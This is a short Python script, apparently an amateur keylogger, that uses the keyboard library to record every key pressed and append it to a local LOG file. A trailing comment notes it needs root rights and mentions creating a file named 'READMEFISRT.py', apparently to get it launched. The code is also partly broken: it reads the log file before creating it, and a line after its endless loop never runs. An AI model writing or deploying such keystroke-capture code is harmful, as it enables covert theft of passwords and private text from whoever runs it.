import keyboard
while True:
	keytolog = keyboard.read_key()
	if keytolog != "":
		r = open("./LOG").read()
		f = open("./LOG", 'w')
		rf = str(r) + str(keytolog)
		f.write(rf)
input()
# this needs sudo xP. ok. make a READMEFISRT.py ill make that ok
